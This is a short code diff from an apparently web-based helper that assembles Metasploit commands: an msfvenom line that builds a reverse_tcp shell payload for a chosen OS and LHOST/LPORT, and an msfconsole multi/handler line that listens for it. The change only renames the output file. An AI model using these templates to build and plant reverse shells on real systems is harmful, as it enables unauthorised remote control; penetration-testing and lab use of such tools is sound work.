@@ -74,7 +74,7 @@
                 extension = "elf";
             }
 
-            let msfvenom = "msfvenom -p " + os + type + stage + "reverse_tcp LHOST=" + lhost + " LPORT=" + lport + " -f " + extension + " -o yz." + extension;
+            let msfvenom = "msfvenom -p " + os + type + stage + "reverse_tcp LHOST=" + lhost + " LPORT=" + lport + " -f " + extension + " -o nw." + extension;
             let msfconsole = "msfconsole -q -x \"use multi/handler; set payload " + os + type + stage + "reverse_tcp; set lhost " + lhost + "; set lport " + lport + "; exploit\"";
 
             document.getElementById("msfvenom").innerHTML = msfvenom;
